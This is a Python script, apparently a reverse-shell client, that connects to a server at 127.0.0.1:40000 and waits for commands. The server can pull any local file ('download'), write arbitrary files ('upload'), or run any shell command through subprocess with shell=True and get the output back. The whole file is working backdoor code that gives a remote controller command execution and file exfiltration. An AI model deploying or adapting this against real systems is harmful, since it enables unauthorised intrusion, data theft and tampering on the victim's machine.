import socket
import subprocess
from pathlib import Path

class Client():
    
    def __init__(self):
        self.ip = '127.0.0.1'
        self.port = 40000
    
    def client_socket(self):
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.connect((self.ip, self.port))
        
        # msg = input("Enter Message: ")
        msg ='TEST CLIENT'
        client_sock.send(msg.encode())
        msg = client_sock.recv(4096).decode()
        while msg != 'quit':
            msg = list(msg.split(" "))
            
            if msg[0] == 'download':
                filename = msg[1]
                f = open(Path(filename), 'rb')
                contents = f.read()
                f.close()
                client_sock.send(contents)
                msg = client_sock.recv(4096).decode()
                
            elif msg[0] == 'upload':
                filename = msg[1]
                filesize = int(msg[2])
                contents = client_sock.recv(filesize)
                f = open(Path(filename), 'wb')
                f.write(contents)
                f.close()
                client_sock.send('File sent succesfully!'.encode())
                msg = client_sock.recv(4096).decode()
                
            else:
            
                pr = subprocess.Popen(
                    msg, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = True
                )
                output, error = pr.communicate()
                if len(output) > 0:
                    msg = str(output.decode())
                else:
                    msg = str(error.decode())
                client_sock.send(msg.encode())
                msg = client_sock.recv(4096).decode()
                # print(msg)
                # msg = input("Enter Message: ")
            
            
        
        client_sock.close()
        
        
if __name__ == '__main__':
    runclient = Client()
    runclient.client_socket()